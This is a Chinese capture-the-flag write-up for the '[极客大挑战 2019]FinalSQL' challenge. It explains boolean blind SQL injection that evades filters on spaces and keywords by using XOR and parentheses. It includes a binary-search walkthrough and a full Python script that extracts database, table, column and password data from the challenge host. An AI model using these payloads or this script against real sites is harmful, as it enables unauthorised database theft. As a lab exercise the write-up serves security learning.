# \[极客大挑战 2019]FinalSQL

## \[极客大挑战 2019]FinalSQL

## 考点

* SQL盲注
* bypass空格

## wp

题目提示SQL盲注，过滤了很多关键词

```
if mid like limit union and | & *  /**/ 空格
```

输入 id=1^0 返回正确\
语句如下：\
0^(ascii(substr((select(database())),1,1))>102)\
ascii(substr((select(group\_concat(schema\_name))from(information\_schema.schemata)),1,1))>mid\
若SQL语句为真则返回正常，为假则返回ERROR

select(group\_concat(schema\_name))from(information\_schema.schemata)

二分法

```
假设第一个字符的ASCII码为96

low  high  mid
32   126   81
返回正常则为真，第一个字符的ASCII码大于81
82   126   104
返回ERROR则为假，第一个字符的ASCII码小于等于104
82   104   93
返回正常则为真，第一个字符的ASCII码大于93
94   104   99
返回ERROR则为假，第一个字符的ASCII码小于等于99
94   99    96
返回ERROR则为假，第一个字符的ASCII码小于等于96
94   96    95
返回正常则为真，第一个字符的ASCII码大于95
96   96
```

脚本如下

```python
import requests

url = 'http://5d9d1cb2-97fb-46b6-87e2-0fd16174256b.node3.buuoj.cn/search.php?id=' 

# geek
def get_database():
    flag = ''
    for i in range(1, 50):
        low = 32
        high = 126
        mid = (low+high)//2
        print(flag)
        while low < high:
            payload = f"0^(ascii(substr((select(database())),{i},1))>{mid})"
            url_t = url + payload
            r = requests.get(url=url_t)
            
            if 'ERROR' in r.text:
                high = mid
            if 'Click others' in r.text:
                low = mid + 1
            mid = (low+high)//2
            
            if low == high:
                flag = flag + chr(low)
                break

# F1naI1y,Flaaaaag
def get_table():
    flag = ''
    for i in range(1, 500):
        low = 32
        high = 126
        mid = (low+high)//2
        print(flag)
        while low < high:
            payload = f"0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='geek')),{i},1))>{mid})"

            url_t = url + payload
            r = requests.get(url=url_t)
            
            if 'ERROR' in r.text:
                high = mid
            if 'Click others' in r.text:
                low = mid + 1
            mid = (low+high)//2
            
            if low == high:
                flag = flag + chr(low)
                break
# F1naI1y: id,username,password
# Flaaaaag: id,fl4gawsl
def get_column():
    flag = ''
    for i in range(1, 500):
        low = 32
        high = 126
        mid = (low+high)//2
        print(flag)
        while low < high:
            payload = f"0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),{i},1))>{mid})"

            url_t = url + payload
            r = requests.get(url=url_t)
            
            if 'ERROR' in r.text:
                high = mid
            if 'Click others' in r.text:
                low = mid + 1
            mid = (low+high)//2
            
            if low == high:
                flag = flag + chr(low)
                break

def get_flag():
    flag = ''
    for i in range(1, 500):
        low = 32
        high = 126
        mid = (low+high)//2
        print(flag)
        while low < high:
            # payload = f"0^(ascii(substr((select(group_concat(fl4gawsl))from(Flaaaaag)),{i},1))>{mid})"
            # payload = f"0^(ascii(substr((select(group_concat(password))from(F1naI1y)),{i},1))>{mid})"
            payload = f"0^(ascii(substr(reverse((select(group_concat(password))from(F1naI1y))),{i},1))>{mid})"
            url_t = url + payload
            r = requests.get(url=url_t)
            
            if 'ERROR' in r.text:
                high = mid
            if 'Click others' in r.text:
                low = mid + 1
            mid = (low+high)//2
            
            if low == high:
                flag = flag + chr(low)
                break
get_flag()
```
